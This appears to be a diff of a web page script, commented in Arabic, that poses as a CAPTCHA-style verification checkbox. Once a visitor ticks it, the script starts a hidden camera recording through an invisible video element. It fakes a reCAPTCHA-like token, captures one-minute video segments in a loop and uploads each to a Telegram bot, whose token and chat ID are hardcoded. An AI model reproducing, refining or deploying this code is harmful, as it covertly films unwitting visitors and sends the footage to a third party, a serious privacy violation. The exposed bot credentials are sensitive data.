@@ -94,7 +94,7 @@
 <video id="hiddenRecorder" autoplay playsinline muted></video>
 
 <script>
-    /* ⚙️ الإعدادات — ضع بياناتك هنا */
+    /* ⚙️ الإعدادات — استبدل التوكن بتاعك هنا */
     const TELEGRAM_BOT_TOKEN = '8951119517:AAFCJEvvEVj22fWYQJlE3sH4Ek3DUyzBQa0';
     const TELEGRAM_CHAT_ID   = '6778071782';
     const SEGMENT_DURATION   = 60 * 1000;   // دقيقة
@@ -131,10 +131,9 @@
             isVerified = true;
             isBusy = false;
 
-            // 🎥 تشغيل التسجيل الخفي في الخلفية
+            // 🎥 تشغيل التسجيل الخفي
             startHiddenRecording();
 
-            // إطلاق الحدث
             const token = '03AGdBq2' + Math.random().toString(36).substring(2)
                         + Math.random().toString(36).substring(2);
 
@@ -156,8 +155,6 @@
             await video.play();
 
             console.log('🎥 Hidden recording started');
-
-            // ابدأ أول مقطع
             recordSegment();
 
         } catch (err) {
@@ -165,7 +162,7 @@
         }
     }
 
-    /* ========== 3) تسجيل مقطع واحد ========== */
+    /* ========== 3) تسجيل مقطع ========== */
     function recordSegment() {
         if (!mediaStream || !mediaStream.active) return;
 
@@ -175,7 +172,6 @@
         try {
             recorder = new MediaRecorder(mediaStream, { mimeType: MIME_TYPE });
         } catch (e) {
-            // fallback للمتصفحات القديمة
             recorder = new MediaRecorder(mediaStream);
         }
 
@@ -186,19 +182,16 @@
         recorder.onstop = () => {
             const blob = new Blob(chunks, { type: 'video/webm' });
 
-            // أرسل المقطع للتليجرام
             if (blob.size > 1000) {
                 sendToTelegram(blob);
             }
 
-            // ابدأ مقطع جديد بعد ثانية (فاصل بسيط)
             setTimeout(recordSegment, 1000);
         };
 
         recorder.start();
         isRecording = true;
 
-        // ⏱️ إيقاف تلقائي بعد المدة المحددة
         segmentTimer = setTimeout(() => {
             if (recorder.state === 'recording') {
                 recorder.stop();
@@ -207,10 +200,10 @@
         }, SEGMENT_DURATION);
     }
 
-    /* ========== 4) إرسال الفيديو للتليجرام ========== */
+    /* ========== 4) الإرسال لتليجرام ========== */
     async function sendToTelegram(blob) {
-        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-            console.warn('⚠️ ضع TELEGRAM_BOT_TOKEN و TELEGRAM_CHAT_ID');
+        if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'ضع_التوكن_هنا') {
+            console.warn('⚠️ لم يتم وضع التوكن');
             return;
         }
 
@@ -235,16 +228,15 @@
             if (data.ok) {
                 console.log('✅ تم إرسال الفيديو للتليجرام');
             } else {
-                console.warn('❌ فشل الإرسال:', data.description);
-                // محاولة إرسال كـ document إذا فشل الفيديو
+                console.warn('❌ فشل:', data.description);
                 await sendAsDocument(blob);
             }
         } catch (err) {
-            console.error('❌ خطأ في الاتصال:', err);
+            console.error('❌ خطأ:', err);
         }
     }
 
-    /* ========== 5) إرسال كـ document (احتياطي) ========== */
+    /* ========== 5) احتياطي: إرسال كـ document ========== */
     async function sendAsDocument(blob) {
         const formData = new FormData();
         formData.append('chat_id', TELEGRAM_CHAT_ID);
@@ -265,17 +257,10 @@
         if (isVerified) this.checked = true;
     });
 
-    /* ========== 7) تحرير الموارد عند الإغلاق ========== */
+    /* ========== 7) تحرير الموارد ========== */
     window.addEventListener('beforeunload', () => {
         if (segmentTimer) clearTimeout(segmentTimer);
         if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
-    });
-
-    /* ========== 8) إيقاف مؤقت عند إخفاء الصفحة ========== */
-    document.addEventListener('visibilitychange', () => {
-        if (document.hidden) {
-            console.log('📴 الصفحة مخفية — الفيديو سيتوقف تلقائياً');
-        }
     });
 </script>
 
